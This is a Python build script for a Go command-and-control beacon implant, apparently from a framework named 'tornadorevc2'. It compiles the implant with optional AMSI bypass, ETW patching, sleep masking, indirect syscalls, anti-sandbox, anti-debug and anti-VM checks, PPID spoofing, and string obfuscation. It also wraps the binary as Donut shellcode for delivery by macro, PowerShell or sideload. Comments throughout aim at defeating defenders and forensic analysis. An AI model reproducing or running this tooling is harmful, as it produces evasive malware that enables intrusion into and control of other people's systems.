"""Cross-compilation of the Go beacon agent.

Every behavioural property is set at build time via linker flags. There
is no runtime configuration file, no environment variable parsing, no
on-disk artefact that a defender can retrieve and analyse. The binary
you build is the binary that runs.

Evasion features are opt-in flags on BeaconBuildConfig. Named OPSEC
profiles bundle common combinations.
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
from dataclasses import dataclass
from typing import List, Optional


# ---------------------------------------------------------------------
# Configuration

@dataclass
class BeaconBuildConfig:
    # Connection
    url:           str = ''
    profile_name:  str = 'default'
    kill_days:     int = 30

    # Working-hours window (target local time, "HH:MM"). Set both to
    # "00:00" to disable the gate.
    work_hours_start: str = '08:00'
    work_hours_end:   str = '19:00'

    # TLS ClientHello fingerprint. Accepted values:
    #   'go'      — standard library crypto/tls (default)
    #   'chrome'  — Chrome 120 ClientHello via uTLS
    #   'firefox' — Firefox 120 ClientHello via uTLS
    #   'safari'  — Safari 16.0 ClientHello via uTLS
    #
    # See agent/tls_fingerprint.go for the ALPN behaviour that
    # applies when a browser profile is used. The build requires the
    # `utls` module; if it is not yet a dependency of the agent
    # module, the first build after setting a non-go profile will
    # fail with a `missing go.sum entry` error. Run `go mod tidy`
    # inside agent/ to add it.
    tls_profile: str = 'go'


    # Output
    target_os:     str = 'linux'
    target_arch:   str = 'amd64'
    output_format: str = 'exe'   # exe, dll, elf, shellcode

    # Evasion — all compile-time
    antisanbox:         bool = False     # run sandbox heuristics at startup
    amsi_bypass:        bool = False
    etw_patch:          bool = False
    sleep_mask:         str = 'none'    # none, rc4, aes-ctr, ekko
    syscall_method:     str = 'direct'  # direct, indirect
    string_obfuscation: bool = False
    garble:             bool = False
    upx:                bool = False
    ppid_spoof:         bool = False
    antidebug:          bool = False
    antivm:             bool = False
    # Diagnostic stderr on the target. Off by default — a payload
    # that logs leaves a forensic artefact. Turn on only for a
    # debugging build.
    verbose:            bool = False

    # Result signing keypair. If empty, a fresh keypair is generated
    # on every build, which means a redeployed agent will present a
    # different public key against the same fingerprint and be
    # rejected by the server's TOFU pinning. Set this to a stable
    # path (e.g. `~/.tornadorevc2/agent.key`) to make rebuilds
    # idempotent.
    agent_keypair_path: str = ''

    # Embedded trust material — paths on the operator machine, read at
    # build time and baked into the binary via -ldflags. Empty string
    # means "do not embed".
    server_pubkey_path: str = ''
    client_cert_path:   str = ''
    client_key_path:    str = ''
    root_ca_path:       str = ''


# Directory of C2 profile JSON files, relative to the repo root.
DEFAULT_C2_PROFILE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    'profiles', 'c2',
)


def load_c2_profile(name_or_path: str) -> Optional[dict]:
    """Load a C2 profile by name from profiles/c2/, or by explicit path.

    Returns a dict suitable for the `profile` argument of
    BeaconBuilder.build(), or None if the profile cannot be found.

    A C2 profile controls the HTTP fingerprint:
        user_agent, linux_user_agent,
        beacon_path, tasks_path, results_path,
        extra_headers, request_headers
    It does not control evasion — that is the OPSEC profile.
    """
    if not name_or_path:
        return None

    # Accept a full path, or a bare name resolved against the default dir.
    if os.path.isfile(name_or_path):
        path = name_or_path
    else:
        stem = name_or_path[:-5] if name_or_path.endswith('.json') \
               else name_or_path
        path = os.path.join(DEFAULT_C2_PROFILE_DIR, stem + '.json')

    if not os.path.exists(path):
        return None

    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return None


def list_c2_profiles() -> List[str]:
    """Return sorted profile names from the default directory."""
    if not os.path.isdir(DEFAULT_C2_PROFILE_DIR):
        return []
    return sorted(
        e[:-5] for e in os.listdir(DEFAULT_C2_PROFILE_DIR)
        if e.endswith('.json') and not e.startswith('.')
    )

OPSEC_PROFILES = {
    'default': BeaconBuildConfig(),

    'stealth': BeaconBuildConfig(
        # AMSI and ETW patching are removed from `stealth`. Both are
        # heavily signatured in their current form (the `mov eax,
        # 0x80070057; ret` byte pattern for AMSI, the single-byte `ret`
        # for ETW), and the agent does not load .NET or PowerShell
        # assemblies, so patching removes a protection it does not use.
        # Engagements that require a .NET loader should use `opsec` or
        # `paranoid`.
        sleep_mask='none',
        string_obfuscation=True,
    ),

    'opsec': BeaconBuildConfig(
        antisanbox=True,
        amsi_bypass=True,
        etw_patch=True,
        sleep_mask='aes-ctr',
        syscall_method='indirect',
        string_obfuscation=True,
        garble=True,
        ppid_spoof=True,
        antidebug=True,
        antivm=True,
        tls_profile='chrome',
    ),

    'paranoid': BeaconBuildConfig(
        antisanbox=True,
        amsi_bypass=True,
        etw_patch=True,
        sleep_mask='ekko',
        syscall_method='indirect',
        string_obfuscation=True,
        garble=True,
        ppid_spoof=False,
        antidebug=True,
        antivm=True,
        upx=False,
        tls_profile='chrome',
    ),
}


# ---------------------------------------------------------------------
# Builder

class BeaconBuilder:
    """Compiles the Go beacon with a specific configuration."""

    def __init__(self, source_dir: str, output_dir: str,
                 agent_dir: str = None):
        self.source_dir = source_dir
        self.output_dir = output_dir
        self.repo_root = os.path.dirname(os.path.dirname(
            os.path.abspath(source_dir)))
        # Resolve the Go module directory. An explicit agent_dir wins;
        # otherwise we probe the plausible layouts and pick the first
        # one that actually contains a go.mod. This removes the
        # dependency on a specific directory naming convention.
        if agent_dir:
            self.agent_dir = os.path.abspath(agent_dir)
        else:
            self.agent_dir = self._find_agent_dir()
        self._assert_toolchain()

    def _find_agent_dir(self) -> str:
        """Locate the Go module directory by searching for go.mod.

        Candidates, in order:

          1. <pkg>/agent              — agent sibling of beacon/
          2. <repo>/agent             — agent at the repo root
          3. <repo>/tornadorevc2/agent — agent inside a nested package

        The first candidate whose directory contains go.mod wins. If
        none match, the primary candidate is returned so the error
        from _assert_toolchain names a specific path.
        """
        pkg_dir  = os.path.dirname(os.path.abspath(self.source_dir))
        candidates = [
            os.path.join(pkg_dir, 'agent'),
            os.path.join(self.repo_root, 'agent'),
            os.path.join(self.repo_root, 'tornadorevc2', 'agent'),
        ]
        for candidate in candidates:
            if os.path.isfile(os.path.join(candidate, 'go.mod')):
                return candidate
        return candidates[0]

    def build(self, config: BeaconBuildConfig,
              profile: Optional[dict] = None) -> str:
        """Compile the beacon. Returns the output path."""
        os.makedirs(self.output_dir, exist_ok=True)
        if not config.agent_keypair_path:
            print("[build] warning: agent_keypair_path is empty — a new "
                  "signing keypair will be generated. Redeploying over "
                  "an existing session will be rejected as an "
                  "impersonation attempt. Set agent_keypair_path to a "
                  "stable file to make rebuilds idempotent.")
        out = os.path.join(self.output_dir, self._output_name(config))

        env = self._build_env(config)
        ldflags = self._build_ldflags(config, profile)

        cmd = self._build_command(config, ldflags, out)
        subprocess.run(cmd, env=env, cwd=self.agent_dir, check=True)

        if config.upx and shutil.which('upx'):
            subprocess.run(['upx', '--best', '--quiet', out], check=False)

        if config.output_format == 'shellcode':
            self._convert_to_shellcode(out)

        return out

    # ------------------------------------------------------------------

    def _assert_toolchain(self) -> None:
        if shutil.which('go') is None:
            raise RuntimeError('go toolchain not found on PATH')
        gomod = os.path.join(self.agent_dir, 'go.mod')
        if not os.path.isfile(gomod):
            pkg_dir = os.path.dirname(os.path.abspath(self.source_dir))
            raise RuntimeError(
                f'go.mod not found. Checked:\n'
                f'  {os.path.join(pkg_dir, "agent")}\n'
                f'  {os.path.join(self.repo_root, "agent")}\n'
                f'  {os.path.join(self.repo_root, "tornadorevc2", "agent")}\n'
                f'Place go.mod in one of these directories, or pass '
                f'agent_dir=<path> to BeaconBuilder().'
            )

    def _build_env(self, cfg: BeaconBuildConfig) -> dict:
        env = os.environ.copy()
        env['GOOS'] = cfg.target_os
        env['GOARCH'] = cfg.target_arch
        env['CGO_ENABLED'] = '0'
        return env

    def _build_command(self, cfg: BeaconBuildConfig,
                       ldflags: List[str], out: str) -> List[str]:
        # -s strips the Go symbol table; -w strips DWARF. Together they
        # remove the names that `go tool nm` and `objdump` would
        # otherwise hand a reverse engineer. They do NOT remove string
        # literals — those live in .rodata and require garble -literals
        # or the XOR scheme in _build_ldflags.
        all_flags = ['-s', '-w'] + list(ldflags)
        go = ['go', 'build', '-trimpath',
              '-ldflags', ' '.join(all_flags),
              '-o', out, '.']
        if cfg.garble:
            if shutil.which('garble') is None:
                raise RuntimeError(
                    'garble requested but not on PATH. Install with:\n'
                    '    go install mvdan.cc/garble@latest')
            # Strip only 'go' — keep 'build' and everything after it.
            # garble expects its own flags, then 'build', then the
            # standard go-build arguments.
            go = ['garble', '-literals', '-tiny'] + go[1:]
        return go

    def _build_ldflags(self, cfg: BeaconBuildConfig,
                       profile: Optional[dict],
                       server_pubkey_pem: str = '',
                       client_cert_pem: str = '',
                       client_key_pem: str = '',
                       root_ca_pem: str = '') -> List[str]:
        import base64 as _b64

        # Read embedded material from disk when a path was configured
        # and no PEM was passed explicitly. This is what makes the
        # config fields above actually reach the binary.
        def _read_pem(path: str) -> str:
            if not path:
                return ''
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    return f.read()
            except OSError:
                return ''

        server_pubkey_pem = server_pubkey_pem or _read_pem(cfg.server_pubkey_path)
        client_cert_pem   = client_cert_pem   or _read_pem(cfg.client_cert_path)
        client_key_pem    = client_key_pem    or _read_pem(cfg.client_key_path)
        root_ca_pem       = root_ca_pem       or _read_pem(cfg.root_ca_path)

        # Per-build obfuscation key. Every -X-injected value that would
        # otherwise appear in `strings` output on the compiled binary is
        # XORed with this key and base64-encoded. The key itself is
        # embedded in the binary, so this is obfuscation, not encryption
        # — its purpose is to defeat `strings | grep` and raise the cost
        # of casual reverse engineering. A motivated analyst with a
        # debugger can still recover everything; see the module
        # docstring.
        import secrets as _secrets
        obf_key = _secrets.token_bytes(16)

        def _obf(s: str) -> str:
            raw = s.encode('utf-8')
            xored = bytes(b ^ obf_key[i % len(obf_key)]
                          for i, b in enumerate(raw))
            return _b64.b64encode(xored).decode('ascii')

        flags = [
            f"-X main.ObfKeyHex={obf_key.hex()}",
            f"-X main.DefaultURL={_obf(cfg.url)}",
            f"-X main.DefaultProfile={cfg.profile_name}",
            f"-X main.KillDaysRaw={cfg.kill_days}",
            f"-X main.WorkHoursStartRaw={cfg.work_hours_start}",
            f"-X main.WorkHoursEndRaw={cfg.work_hours_end}",
            f"-X main.TLSProfile={cfg.tls_profile}",
            # Verbose controls whether the agent writes diagnostic
            # lines to stderr on the target. Off by default: a payload
            # that logs leaves a forensic artefact. Set
            # BeaconBuildConfig.verbose=True (or pass --verbose on the
            # operator command / answer y in the wizard) for a
            # debugging build only. Never enable for a live engagement.
            f"-X main.VerboseRaw={'true' if getattr(cfg, 'verbose', False) else 'false'}",
        ]

        # Embed the payload values that must survive on the target.
        if profile is not None:
            # Merge in the three path fields if the operator set them
            # at the top level of the JSON. This lets a profile
            # separate the three endpoints across different URIs.
            merged = dict(profile)
            for key in ('beacon_path', 'tasks_path',
                        'results_path', 'request_headers'):
                if key in merged:
                    continue
                # Fall back to a nested "c2" section if the profile
                # author organised it that way.
                c2 = merged.get('c2') or {}
                if key in c2:
                    merged[key] = c2[key]
            flags.append(f"-X main.ProfileJSON={_obf(json.dumps(merged))}")
        if server_pubkey_pem:
            encoded = _b64.b64encode(
                server_pubkey_pem.encode('utf-8')
            ).decode('ascii')
            flags.append(f"-X main.ServerPubKeyPem={encoded}")
        if client_cert_pem:
            encoded = _b64.b64encode(
                client_cert_pem.encode('utf-8')
            ).decode('ascii')
            flags.append(f"-X main.ClientCertPem={encoded}")
        if client_key_pem:
            encoded = _b64.b64encode(
                client_key_pem.encode('utf-8')
            ).decode('ascii')
            flags.append(f"-X main.ClientKeyPem={encoded}")
        if root_ca_pem:
            encoded = _b64.b64encode(
                root_ca_pem.encode('utf-8')
            ).decode('ascii')
            flags.append(f"-X main.RootCAPem={encoded}")
        for name, value in (
            ('AntiSandboxEnabledRaw', cfg.antisanbox),
            ('AmsiBypassRaw',         cfg.amsi_bypass),
            ('EtwPatchRaw',           cfg.etw_patch),
            ('SleepMaskEnabledRaw',   cfg.sleep_mask != 'none'),
            ('StringObfuscationRaw',  cfg.string_obfuscation),
            ('PpidSpoofRaw',          cfg.ppid_spoof),
            ('AntiDebugRaw',          cfg.antidebug),
            ('AntiVmRaw',             cfg.antivm),
        ):
            flags.append(f"-X main.{name}={'true' if value else 'false'}")

        # Sleep-mask algorithm. The agent reads SleepMaskType to pick
        # which in-memory decryptor to apply. Recognised values:
        # none, rc4, aes-ctr, ekko.
        flags.append(f"-X main.SleepMaskType={cfg.sleep_mask}")

        # Syscall method. Recognised values: direct, indirect.
        flags.append(f"-X main.SyscallMethod={cfg.syscall_method}")

        # Result-signing keypair. The agent's private key is embedded;
        # the public half is sent to the server at check-in.
        priv_pem = self._ensure_agent_keypair(cfg)
        if priv_pem:
            encoded = _b64.b64encode(
                priv_pem.encode('utf-8')).decode('ascii')
            flags.append(f"-X main.AgentPrivKeyPem={encoded}")

        return flags

    def _ensure_agent_keypair(self, cfg: BeaconBuildConfig) -> str:
        """Return the agent's private key PEM, generating it on first
        use. The public half is not embedded — the agent sends it to the
        server at check-in and the server pins it per session."""
        if cfg.agent_keypair_path and os.path.exists(cfg.agent_keypair_path):
            with open(cfg.agent_keypair_path, 'r') as f:
                return f.read()

        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            # Result signing is optional. If cryptography is not
            # installed, the agent is built without signing.
            return ''

        priv = ec.generate_private_key(ec.SECP256R1())
        priv_pem = priv.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode('ascii')

        if cfg.agent_keypair_path:
            os.makedirs(
                os.path.dirname(cfg.agent_keypair_path) or '.',
                exist_ok=True)
            with open(cfg.agent_keypair_path, 'w') as f:
                f.write(priv_pem)

        return priv_pem

    def _output_name(self, cfg: BeaconBuildConfig) -> str:
        stem = f"beacon_{cfg.target_os}_{cfg.target_arch}"
        ext = {
            'exe':       '.exe' if cfg.target_os == 'windows' else '',
            'dll':       '.dll',
            'elf':       '',
            # Shellcode format produces a PE first, then wraps it with
            # Donut. The intermediate file is a PE, not shellcode — name
            # it accordingly so the output of the final Donut step does
            # not end up as `.exe.bin` or `.bin.bin`.
            'shellcode': '.exe' if cfg.target_os == 'windows' else '',
        }.get(cfg.output_format, '')
        return stem + ext

    def _convert_to_shellcode(self, path: str) -> None:
        """Wrap the compiled PE in a Donut stub.

        Donut produces position-independent shellcode that loads the
        wrapped PE into its own allocated memory, resolves imports,
        and executes. The result can be delivered through any loader
        that accepts raw shellcode — BOF, macro, PowerShell,
        DLL sideload, or a stager.

        Tries, in order:
          1. A local `donut` binary on PATH.
          2. `go-donut` if the Go toolchain is available.
          3. A vendored `donut` binary next to the builder.
        """
        donut = shutil.which('donut')
        if donut is None:
            # Try a vendored binary next to the beacon package.
            vendored = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                'bin', 'donut',
            )
            if os.path.exists(vendored):
                donut = vendored
            elif os.name == 'nt':
                vendored += '.exe'
                if os.path.exists(vendored):
                    donut = vendored

        if donut is None:
            raise RuntimeError(
                'shellcode output requires the Donut binary on PATH, '
                'or a vendored copy at beacon/bin/donut. '
                'Download from: https://github.com/TheWover/donut/releases'
            )

        # Derive the shellcode path by stripping the PE extension and
        # appending .bin. `path` is the intermediate PE produced by
        # `go build`; it is left on disk for the operator to inspect
        # or delete.
        base, _ = os.path.splitext(path)
        out = base + '.bin'

        # Donut's -a flag selects the target architecture for the
        # generated shellcode. The supported set is: 1 = x86,
        # 2 = amd64, 3 = x86+amd64. arm64 is not supported by the
        # current Donut release; fail loudly rather than silently
        # producing amd64 shellcode for an arm64 PE.
        arch = '-a', '2'   # default amd64
        # The builder does not currently expose target_arch to this
        # method, so the arch is inferred from the PE filename.
        if '_arm64' in os.path.basename(path):
            raise RuntimeError(
                'shellcode output is not supported for arm64 targets; '
                'Donut emits amd64 only')

        cmd = [
            donut,
            '-f', '2',          # 2 = raw binary
            *arch,
            '-o', out,
            path,
        ]
        subprocess.run(cmd, check=True)
        # Verify the output exists.
        if not os.path.exists(out):
            raise RuntimeError(f'donut did not produce {out}')